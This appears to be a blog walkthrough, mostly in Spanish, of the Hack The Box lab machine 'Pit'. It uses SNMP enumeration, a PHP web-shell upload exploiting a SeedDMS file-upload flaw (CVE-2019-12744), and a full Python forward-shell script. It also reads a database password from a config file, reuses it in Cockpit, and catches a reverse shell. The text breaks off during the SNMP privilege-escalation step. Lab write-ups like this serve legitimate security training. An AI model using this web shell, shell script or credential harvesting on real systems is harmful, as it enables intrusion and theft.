---
layout: single
title: Pit - Hack The Box
excerpt: "Pit is a medium difficulty Linux machine that focuses on SNMP enumeration and exploitation, while introducing basic SELinux restrictions and web misconfigurations. By enumerating SNMP via the default insecure `public` community, information about filesystems and users can be obtained. This allows attackers to discover and gain access to a vulnerable SeedDMS instance, which was incorrectly patched by applying Apache `.htaccess` rules to an Nginx server where they are not effective. Exploiting [CVE-2019-12744](https://nvd.nist.gov/vuln/detail/CVE-2019-12744) results in Remote Command Execution (with some SELinux restrictions) and subsequent access to a Cockpit console via password reuse. Privileges are escalated by writing a Bash script that is executed as an SNMP extension when the corresponding OID is queried."
date: 2025-06-20
classes: wide
header:
  teaser: /img2/pit.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Medium
tags:
  - Information Leakage
  - SNMP Enumeration (Snmpwalk/Snmpbulkwalk)
  - SeedDMS Exploitation
  - SNMP Code Execution
---


## Reconnaissance

- Nmap

```bash
❯ nmap -sS --open -p- --min-rate 5000 -n -Pn 10.10.10.241
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-20 12:32 CEST
Nmap scan report for 10.10.10.241
Host is up (0.048s latency).
Not shown: 65500 filtered tcp ports (no-response), 32 filtered tcp ports (admin-prohibited)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9090/tcp open  zeus-admin

Nmap done: 1 IP address (1 host up) scanned in 26.49 seconds
```

- Vulnerability and vesion scan

```bash
❯ nmap -sCV -p22,80,9090 10.10.10.241
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-20 12:33 CEST
Nmap scan report for 10.10.10.241
Host is up (0.054s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 (RSA)
|   256 c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 (ECDSA)
|_  256 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 (ED25519)
80/tcp   open  http    nginx 1.14.1
|_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux
|_http-server-header: nginx/1.14.1
9090/tcp open  http    Cockpit web service 221 - 253
|_http-title: Did not follow redirect to https://10.10.10.241:9090/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.63 seconds
```

- Add domain to /etc/hosts

```bash
❯ echo "10.10.10.241 pit.htb" >> /etc/hosts
```

- UDP Scan

```bash
❯ nmap --top-ports 10 --open -n -Pn -sU 10.10.10.241
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-20 13:15 CEST
Nmap scan report for 10.10.10.241
Host is up (0.037s latency).
Not shown: 7 filtered udp ports (admin-prohibited)
PORT    STATE         SERVICE
123/udp open|filtered ntp
138/udp open|filtered netbios-dgm
161/udp open          snmp

Nmap done: 1 IP address (1 host up) scanned in 5.02 seconds
```

- SNMP Scan

```bash
❯ snmpwalk -v2c -c public 10.10.10.241 . | grep -vE "INTEGER|Timeticks|scsi|irq|card0|xfs|\"\"|ccitt.0"
```

```ruby
iso.3.6.1.2.1.1.1.0 = STRING: "Linux pit.htb 4.18.0-305.10.2.el8_4.x86_64 #1 SMP Tue Jul 20 17:25:16 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.4.0 = STRING: "Root <root@localhost> (configure /etc/snmp/snmp.local.conf)"
iso.3.6.1.2.1.1.5.0 = STRING: "pit.htb"
iso.3.6.1.2.1.1.6.0 = STRING: "Unknown (edit /etc/snmp/snmpd.conf)"
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.25.4.2.1.2.1 = STRING: "systemd"
iso.3.6.1.2.1.25.4.2.1.2.2 = STRING: "kthreadd"
iso.3.6.1.2.1.25.4.2.1.2.3 = STRING: "rcu_gp"
iso.3.6.1.2.1.25.4.2.1.2.4 = STRING: "rcu_par_gp"
iso.3.6.1.2.1.25.4.2.1.2.6 = STRING: "kworker/0:0H-events_highpri"
iso.3.6.1.2.1.25.4.2.1.2.9 = STRING: "mm_percpu_wq"
iso.3.6.1.2.1.25.4.2.1.2.11 = STRING: "rcu_sched"
iso.3.6.1.2.1.25.4.2.1.2.12 = STRING: "migration/0"
iso.3.6.1.2.1.25.4.2.1.2.13 = STRING: "watchdog/0"
iso.3.6.1.2.1.25.4.2.1.2.14 = STRING: "cpuhp/0"
iso.3.6.1.2.1.25.4.2.1.2.15 = STRING: "cpuhp/1"
iso.3.6.1.2.1.25.4.2.1.2.16 = STRING: "watchdog/1"
iso.3.6.1.2.1.25.4.2.1.2.17 = STRING: "migration/1"
iso.3.6.1.2.1.25.4.2.1.2.20 = STRING: "kworker/1:0H-events_highpri"
iso.3.6.1.2.1.25.4.2.1.2.23 = STRING: "kdevtmpfs"
iso.3.6.1.2.1.25.4.2.1.2.24 = STRING: "netns"
iso.3.6.1.2.1.25.4.2.1.2.25 = STRING: "kauditd"
iso.3.6.1.2.1.25.4.2.1.2.26 = STRING: "khungtaskd"
iso.3.6.1.2.1.25.4.2.1.2.27 = STRING: "oom_reaper"
iso.3.6.1.2.1.25.4.2.1.2.28 = STRING: "writeback"
iso.3.6.1.2.1.25.4.2.1.2.29 = STRING: "kcompactd0"
iso.3.6.1.2.1.25.4.2.1.2.30 = STRING: "ksmd"
iso.3.6.1.2.1.25.4.2.1.2.31 = STRING: "khugepaged"
iso.3.6.1.2.1.25.4.2.1.2.32 = STRING: "crypto"
iso.3.6.1.2.1.25.4.2.1.2.33 = STRING: "kintegrityd"
iso.3.6.1.2.1.25.4.2.1.2.34 = STRING: "kblockd"
iso.3.6.1.2.1.25.4.2.1.2.35 = STRING: "blkcg_punt_bio"
iso.3.6.1.2.1.25.4.2.1.2.36 = STRING: "tpm_dev_wq"
iso.3.6.1.2.1.25.4.2.1.2.37 = STRING: "md"
iso.3.6.1.2.1.25.4.2.1.2.38 = STRING: "edac-poller"
iso.3.6.1.2.1.25.4.2.1.2.39 = STRING: "watchdogd"
iso.3.6.1.2.1.25.4.2.1.2.67 = STRING: "kswapd0"
iso.3.6.1.2.1.25.4.2.1.2.161 = STRING: "kthrotld"
iso.3.6.1.2.1.25.4.2.1.2.194 = STRING: "acpi_thermal_pm"
iso.3.6.1.2.1.25.4.2.1.2.195 = STRING: "kmpath_rdacd"
iso.3.6.1.2.1.25.4.2.1.2.196 = STRING: "kaluad"
iso.3.6.1.2.1.25.4.2.1.2.198 = STRING: "ipv6_addrconf"
iso.3.6.1.2.1.25.4.2.1.2.199 = STRING: "kstrp"
iso.3.6.1.2.1.25.4.2.1.2.312 = STRING: "kworker/1:1H-kblockd"
iso.3.6.1.2.1.25.4.2.1.2.516 = STRING: "ata_sff"
iso.3.6.1.2.1.25.4.2.1.2.520 = STRING: "mpt_poll_0"
iso.3.6.1.2.1.25.4.2.1.2.522 = STRING: "mpt/0"
iso.3.6.1.2.1.25.4.2.1.2.555 = STRING: "ttm_swap"
iso.3.6.1.2.1.25.4.2.1.2.629 = STRING: "kworker/u4:28-events_unbound"
iso.3.6.1.2.1.25.4.2.1.2.692 = STRING: "kdmflush"
iso.3.6.1.2.1.25.4.2.1.2.702 = STRING: "kdmflush"
iso.3.6.1.2.1.25.4.2.1.2.830 = STRING: "systemd-journal"
iso.3.6.1.2.1.25.4.2.1.2.864 = STRING: "systemd-udevd"
iso.3.6.1.2.1.25.4.2.1.2.922 = STRING: "kdmflush"
iso.3.6.1.2.1.25.4.2.1.2.925 = STRING: "hwmon0"
iso.3.6.1.2.1.25.4.2.1.2.949 = STRING: "jbd2/sda1-8"
iso.3.6.1.2.1.25.4.2.1.2.950 = STRING: "ext4-rsv-conver"
iso.3.6.1.2.1.25.4.2.1.2.974 = STRING: "auditd"
iso.3.6.1.2.1.25.4.2.1.2.976 = STRING: "sedispatch"
iso.3.6.1.2.1.25.4.2.1.2.1008 = STRING: "dbus-daemon"
iso.3.6.1.2.1.25.4.2.1.2.1009 = STRING: "polkitd"
iso.3.6.1.2.1.25.4.2.1.2.1012 = STRING: "VGAuthService"
iso.3.6.1.2.1.25.4.2.1.2.1013 = STRING: "vmtoolsd"
iso.3.6.1.2.1.25.4.2.1.2.1015 = STRING: "sssd"
iso.3.6.1.2.1.25.4.2.1.2.1020 = STRING: "chronyd"
iso.3.6.1.2.1.25.4.2.1.2.1031 = STRING: "rngd"
iso.3.6.1.2.1.25.4.2.1.2.1057 = STRING: "sssd_be"
iso.3.6.1.2.1.25.4.2.1.2.1065 = STRING: "sssd_nss"
iso.3.6.1.2.1.25.4.2.1.2.1069 = STRING: "firewalld"
iso.3.6.1.2.1.25.4.2.1.2.1085 = STRING: "systemd-logind"
iso.3.6.1.2.1.25.4.2.1.2.1096 = STRING: "NetworkManager"
iso.3.6.1.2.1.25.4.2.1.2.1109 = STRING: "sshd"
iso.3.6.1.2.1.25.4.2.1.2.1111 = STRING: "tuned"
iso.3.6.1.2.1.25.4.2.1.2.1128 = STRING: "crond"
iso.3.6.1.2.1.25.4.2.1.2.1148 = STRING: "nginx"
iso.3.6.1.2.1.25.4.2.1.2.1150 = STRING: "nginx"
iso.3.6.1.2.1.25.4.2.1.2.1151 = STRING: "nginx"
iso.3.6.1.2.1.25.4.2.1.2.1204 = STRING: "mysqld"
iso.3.6.1.2.1.25.4.2.1.2.1213 = STRING: "agetty"
iso.3.6.1.2.1.25.4.2.1.2.1349 = STRING: "snmpd"
iso.3.6.1.2.1.25.4.2.1.2.1351 = STRING: "rsyslogd"
iso.3.6.1.2.1.25.4.2.1.2.2213 = STRING: "kworker/0:4-events"
iso.3.6.1.2.1.25.4.2.1.2.3131 = STRING: "kworker/1:7-events"
iso.3.6.1.2.1.25.4.2.1.2.3960 = STRING: "anacron"
iso.3.6.1.2.1.25.4.2.1.2.4257 = STRING: "kworker/0:2-events"
iso.3.6.1.2.1.25.4.2.1.2.4259 = STRING: "kworker/1:1-events"
iso.3.6.1.2.1.25.4.2.1.2.4291 = STRING: "kworker/u4:1-flush-253:0"
iso.3.6.1.2.1.25.4.2.1.2.4347 = STRING: "kworker/1:2-events"
iso.3.6.1.2.1.25.4.2.1.2.4353 = STRING: "kworker/1:3-cgroup_pidlist_destroy"
iso.3.6.1.2.1.25.4.2.1.2.4382 = STRING: "php-fpm"
iso.3.6.1.2.1.25.4.2.1.2.4383 = STRING: "php-fpm"
iso.3.6.1.2.1.25.4.2.1.2.4384 = STRING: "php-fpm"
iso.3.6.1.2.1.25.4.2.1.2.4385 = STRING: "php-fpm"
iso.3.6.1.2.1.25.4.2.1.2.4386 = STRING: "php-fpm"
iso.3.6.1.2.1.25.4.2.1.2.4387 = STRING: "php-fpm"
iso.3.6.1.2.1.25.4.2.1.4.1 = STRING: "/usr/lib/systemd/systemd"
iso.3.6.1.2.1.25.4.2.1.4.830 = STRING: "/usr/lib/systemd/systemd-journald"
iso.3.6.1.2.1.25.4.2.1.4.864 = STRING: "/usr/lib/systemd/systemd-udevd"
iso.3.6.1.2.1.25.4.2.1.4.974 = STRING: "/sbin/auditd"
iso.3.6.1.2.1.25.4.2.1.4.976 = STRING: "/usr/sbin/sedispatch"
iso.3.6.1.2.1.25.4.2.1.4.1008 = STRING: "/usr/bin/dbus-daemon"
iso.3.6.1.2.1.25.4.2.1.4.1009 = STRING: "/usr/lib/polkit-1/polkitd"
iso.3.6.1.2.1.25.4.2.1.4.1012 = STRING: "/usr/bin/VGAuthService"
iso.3.6.1.2.1.25.4.2.1.4.1013 = STRING: "/usr/bin/vmtoolsd"
iso.3.6.1.2.1.25.4.2.1.4.1015 = STRING: "/usr/sbin/sssd"
iso.3.6.1.2.1.25.4.2.1.4.1020 = STRING: "/usr/sbin/chronyd"
iso.3.6.1.2.1.25.4.2.1.4.1031 = STRING: "/sbin/rngd"
iso.3.6.1.2.1.25.4.2.1.4.1057 = STRING: "/usr/libexec/sssd/sssd_be"
iso.3.6.1.2.1.25.4.2.1.4.1065 = STRING: "/usr/libexec/sssd/sssd_nss"
iso.3.6.1.2.1.25.4.2.1.4.1069 = STRING: "/usr/libexec/platform-python"
iso.3.6.1.2.1.25.4.2.1.4.1085 = STRING: "/usr/lib/systemd/systemd-logind"
iso.3.6.1.2.1.25.4.2.1.4.1096 = STRING: "/usr/sbin/NetworkManager"
iso.3.6.1.2.1.25.4.2.1.4.1109 = STRING: "/usr/sbin/sshd"
iso.3.6.1.2.1.25.4.2.1.4.1111 = STRING: "/usr/libexec/platform-python"
iso.3.6.1.2.1.25.4.2.1.4.1128 = STRING: "/usr/sbin/crond"
iso.3.6.1.2.1.25.4.2.1.4.1148 = STRING: "nginx: master process /usr/sbin/nginx"
iso.3.6.1.2.1.25.4.2.1.4.1150 = STRING: "nginx: worker process"
iso.3.6.1.2.1.25.4.2.1.4.1151 = STRING: "nginx: worker process"
iso.3.6.1.2.1.25.4.2.1.4.1204 = STRING: "/usr/libexec/mysqld"
iso.3.6.1.2.1.25.4.2.1.4.1213 = STRING: "/sbin/agetty"
iso.3.6.1.2.1.25.4.2.1.4.1349 = STRING: "/usr/sbin/snmpd"
iso.3.6.1.2.1.25.4.2.1.4.1351 = STRING: "/usr/sbin/rsyslogd"
iso.3.6.1.2.1.25.4.2.1.4.3960 = STRING: "/usr/sbin/anacron"
iso.3.6.1.2.1.25.4.2.1.4.4382 = STRING: "php-fpm: master process (/etc/php-fpm.conf)"
iso.3.6.1.2.1.25.4.2.1.4.4383 = STRING: "php-fpm: pool www"
iso.3.6.1.2.1.25.4.2.1.4.4384 = STRING: "php-fpm: pool www"
iso.3.6.1.2.1.25.4.2.1.4.4385 = STRING: "php-fpm: pool www"
iso.3.6.1.2.1.25.4.2.1.4.4386 = STRING: "php-fpm: pool www"
iso.3.6.1.2.1.25.4.2.1.4.4387 = STRING: "php-fpm: pool www"
iso.3.6.1.2.1.25.4.2.1.5.1 = STRING: "--switched-root --system --deserialize 17"
iso.3.6.1.2.1.25.4.2.1.5.1008 = STRING: "--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only"
iso.3.6.1.2.1.25.4.2.1.5.1009 = STRING: "--no-debug"
iso.3.6.1.2.1.25.4.2.1.5.1012 = STRING: "-s"
iso.3.6.1.2.1.25.4.2.1.5.1015 = STRING: "-i --logger=files"
iso.3.6.1.2.1.25.4.2.1.5.1016 = STRING: "--foreground"
iso.3.6.1.2.1.25.4.2.1.5.1031 = STRING: "-f --fill-watermark=0"
iso.3.6.1.2.1.25.4.2.1.5.1057 = STRING: "--domain implicit_files --uid 0 --gid 0 --logger=files"
iso.3.6.1.2.1.25.4.2.1.5.1065 = STRING: "--uid 0 --gid 0 --logger=files"
iso.3.6.1.2.1.25.4.2.1.5.1069 = STRING: "-s /usr/sbin/firewalld --nofork --nopid"
iso.3.6.1.2.1.25.4.2.1.5.1096 = STRING: "--no-daemon"
iso.3.6.1.2.1.25.4.2.1.5.1109 = STRING: "-D -oCiphers=aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes256-ctr,aes256-cbc,aes128-gcm@openssh.com,aes128-ctr,aes128"
iso.3.6.1.2.1.25.4.2.1.5.1111 = STRING: "-Es /usr/sbin/tuned -l -P"
iso.3.6.1.2.1.25.4.2.1.5.1128 = STRING: "-n"
iso.3.6.1.2.1.25.4.2.1.5.1204 = STRING: "--basedir=/usr"
iso.3.6.1.2.1.25.4.2.1.5.1213 = STRING: "-o -p -- \\u --noclear tty1 linux"
iso.3.6.1.2.1.25.4.2.1.5.1349 = STRING: "-LS0-6d -f"
iso.3.6.1.2.1.25.4.2.1.5.1351 = STRING: "-n"
iso.3.6.1.2.1.25.4.2.1.5.3960 = STRING: "-s"
iso.3.6.1.4.1.2021.2.1.2.1 = STRING: "nginx"
iso.3.6.1.4.1.2021.9.1.2.1 = STRING: "/"
iso.3.6.1.4.1.2021.9.1.2.2 = STRING: "/var/www/html/seeddms51x/seeddms"
iso.3.6.1.4.1.2021.9.1.3.1 = STRING: "/dev/mapper/cl-root"
iso.3.6.1.4.1.2021.9.1.3.2 = STRING: "/dev/mapper/cl-seeddms"
iso.3.6.1.4.1.2021.9.1.11.1 = Gauge32: 2611200
iso.3.6.1.4.1.2021.9.1.11.2 = Gauge32: 125600
iso.3.6.1.4.1.2021.9.1.12.1 = Gauge32: 0
iso.3.6.1.4.1.2021.9.1.12.2 = Gauge32: 0
iso.3.6.1.4.1.2021.9.1.13.1 = Gauge32: 374968
iso.3.6.1.4.1.2021.9.1.13.2 = Gauge32: 75496
iso.3.6.1.4.1.2021.9.1.14.1 = Gauge32: 0
iso.3.6.1.4.1.2021.9.1.14.2 = Gauge32: 0
iso.3.6.1.4.1.2021.9.1.15.1 = Gauge32: 2236232
iso.3.6.1.4.1.2021.9.1.15.2 = Gauge32: 50104
iso.3.6.1.4.1.2021.9.1.16.1 = Gauge32: 0
iso.3.6.1.4.1.2021.9.1.16.2 = Gauge32: 0
iso.3.6.1.4.1.8072.1.3.2.2.1.2.6.109.101.109.111.114.121 = STRING: "/usr/bin/free"
iso.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: "/usr/bin/monitor"
iso.3.6.1.4.1.8072.1.3.2.3.1.1.6.109.101.109.111.114.121 = STRING: "              total        used        free      shared  buff/cache   available"
iso.3.6.1.4.1.8072.1.3.2.3.1.1.10.109.111.110.105.116.111.114.105.110.103 = STRING: "Database status"
iso.3.6.1.4.1.8072.1.3.2.3.1.2.6.109.101.109.111.114.121 = STRING: "              total        used        free      shared  buff/cache   available
Mem:        4023492      314992     3394368        8764      314132     3464124
Swap:       1961980           0     1961980"
iso.3.6.1.4.1.8072.1.3.2.3.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: "Database status
OK - Connection to database successful.
System release info
CentOS Linux release 8.3.2011
SELinux Settings
user

                Labeling   MLS/       MLS/                          
SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles

guest_u         user       s0         s0                             guest_r
root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
user_u          user       s0         s0                             user_r
xguest_u        user       s0         s0                             xguest_r
login

Login Name           SELinux User         MLS/MCS Range        Service

__default__          unconfined_u         s0-s0:c0.c1023       *
michelle             user_u               s0                   *
root                 unconfined_u         s0-s0:c0.c1023       *
System uptime
 07:52:09 up  1:21,  0 users,  load average: 0.08, 0.03, 0.08"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.6.109.101.109.111.114.121.1 = STRING: "              total        used        free      shared  buff/cache   available"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.6.109.101.109.111.114.121.2 = STRING: "Mem:        4023492      314992     3394368        8764      314132     3464124"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.6.109.101.109.111.114.121.3 = STRING: "Swap:       1961980           0     1961980"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.1 = STRING: "Database status"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.2 = STRING: "OK - Connection to database successful."
iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.3 = STRING: "System release info"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.4 = STRING: "CentOS Linux release 8.3.2011"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.5 = STRING: "SELinux Settings"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.6 = STRING: "user"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.8 = STRING: "                Labeling   MLS/       MLS/                          "
iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.9 = STRING: "SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.11 = STRING: "guest_u         user       s0         s0                             guest_r"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.12 = STRING: "root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.13 = STRING: "staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.14 = STRING: "sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.15 = STRING: "system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.16 = STRING: "unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.17 = STRING: "user_u          user       s0         s0                             user_r"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.18 = STRING: "xguest_u        user       s0         s0                             xguest_r"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.19 = STRING: "login"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.21 = STRING: "Login Name           SELinux User         MLS/MCS Range        Service"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.23 = STRING: "__default__          unconfined_u         s0-s0:c0.c1023       *"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.24 = STRING: "michelle             user_u               s0                   *"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.25 = STRING: "root                 unconfined_u         s0-s0:c0.c1023       *"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.26 = STRING: "System uptime"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.27 = STRING: " 07:52:09 up  1:21,  0 users,  load average: 0.08, 0.03, 0.08"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.27 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

> Entre todo el output vemos un proceso que nos puede ser util: /var/www/html/seeddms51x/seeddms. Parece un subdominio con el gestor SeedDMS.

- Add subdomain to /etc/hosts

```bash
❯ echo "10.10.10.241 dms-pit.htb" >> /etc/hosts
```

- Connect to SeedDMS

![](/img2/Pasted%20image%2020250620140518.png)

> Gracias a la información anterior, podemos saber que la ruta donde se aleja el servidor web es /seeddms51x/seeddms, además sabemos que existe un usuario michelle, el cual podemos probar a iniciar sesión con la contraseña michelle.

- Information leakage

![](/img2/Pasted%20image%2020250620150343.png)

## Exploitation

- SeedDMS RCE via file upload (CVE-2019–12744)

```bash
❯ echo "<?php system(\$_GET['cmd']) ?>" > cmd.php
```
![](/img2/Pasted%20image%2020250620150627.png)

![](/img2/Pasted%20image%2020250620150750.png)

> Primero creamos el documento con el script malicioso en php. Una vez creado necesitamos el id del documento, para ello podemos ver el link de la descarga.

![](/img2/Pasted%20image%2020250620151012.png)

> Podemos apuntar hacia el archivo en la siguiente ruta: /seeddms51x/data/1048576/{id}}/1.php

- Forward Shell

```bash
#!/usr/bin/env python3

import requests
import time
import signal
import sys
from termcolor import colored
from base64 import b64encode
from random import randrange


def def_handler(sig,frame):
  print(colored(f"\n\n[!] Saliendo...", 'red'))
  my_forward_shell.remove_data()
  sys.exit(1)

signal.signal(signal.SIGINT, def_handler)


class ForwardShell():


  def __init__(self):
    session = randrange(1000,9999)
    self.main_url = "http://dms-pit.htb/seeddms51x/data/1048576/29/1.php?cmd="

    self.stdin= f"/dev/shm/{session}.input"
    self.stdout= f"/dev/shm/{session}.output"
    self.is_pseudo_terminal=False

  def run_command(self, command):

    command = b64encode(command.encode()).decode()

    data = {
      'cmd' : 'echo "%s" | base64 -d | /bin/sh' %command
    }

    try:
      r= requests.get(self.main_url,params=data, timeout=5)
      return r.text
    except:
      pass


  def write_stdin(self, command):

    command= b64encode(command.encode()).decode()

    data ={
      'cmd': 'echo "%s" | base64 -d > %s' % (command, self.stdin)
    }

    requests.get(self.main_url, params=data)

  def read_stdout(self):

    for _ in range(5):
      read_stdout_command = f"/bin/cat {self.stdout}"
      output_command=self.run_command(read_stdout_command)

    return output_command

  def setup_shell(self):

    command = f"mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s" % (self.stdin,self.stdin,self.stdout)
    self.run_command(command)

  def remove_data(self):
    remove_data_command= f"/bin/rm {self.stdin} {self.stdout}"
    self.run_command(remove_data_command)


  def clear_stdout(self):
    clear_stdout_command= f"echo '' > {self.stdout}"
    self.run_command(clear_stdout_command)

  def run(self):

    self.setup_shell()

    while True:
      command = input(colored(">> ", "yellow"))

      if "script /dev/null -c bash" in command:
        print(colored(f"\n[+] Se ha iniciado una pseudo-terminal\n", "blue"))
        self.is_pseudo_terminal = True

        for key,value in self.help_options.items():
          print(f"\t{key} - {value}")

        print("\n")
        continue

      self.write_stdin(command + "\n")
      output_command= self.read_stdout()

      if command.strip()== "exit":
        self.is_pseudo_terminal = False
        print(colored(f"\n[!] Se ha salido de la pseudo-terminal\n", "red"))
        self.clear_stdout()
        continue

      if self.is_pseudo_terminal:
        lines = output_command.split('\n')

        if len(lines) == 3:
          cleared_output = '\n'.join([lines[-1]] + lines[:1])
        elif len(lines) > 3:
          cleared_output = '\n'.join([lines[-1]] + lines[:1] + lines[2:-1])

        print("\n"+ cleared_output + "\n")

      else:
        print(output_command)

      self.clear_stdout()


if __name__ == '__main__':
  my_forward_shell = ForwardShell()
  my_forward_shell.run()	
```

```bash
❯ rlwrap python3 forward_shell.py
```

```ruby
rlwrap: warning: could not set locale
warnings can be silenced by the --no-warnings (-n) option
```

## Post-exploitation

```bash
>> whoami
```

```ruby
nginx
````

```bash
>> ls ../..
```

```ruby
1048576
backup
cache
conf
log
lucene
staging
```

```bash
>> cd ../../conf
```

```ruby
>> ls
```

```ruby
settings.xml
settings.xml.template
stopwords.txt
```

```bash
>> cat settings.xml
```

```ruby
...
<database dbDriver="mysql" dbHostname="localhost" dbDatabase="seeddms" dbUser="seeddms" dbPass="ied^ieY6xoquu" doNotCheckVersion="false">
...
```

> Encontramos una credencial: "ied^ieY6xoquu", podemos probarla en el panel de CentOS.

![](/img2/Pasted%20image%2020250620212845.png)

- Send reverse shell

![](/img2/Pasted%20image%2020250620221126.png)

```bash
❯ nc -nlvp 9000
```

```ruby
listening on [any] 9000 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.241] 38144
[michelle@pit ~]$       
```

- SNMP Code Execution

```bash
snmpbulkwalk -v2c -c public 10.10.10.241 1
```

```ruby
NET-SNMP-EXTEND-MIB::nsExtendCommand."monitoring" = STRING: /usr/bin/monitor
NET-SNMP-EXTEND-MIB::nsExtendArgs."memory" = STRING: 
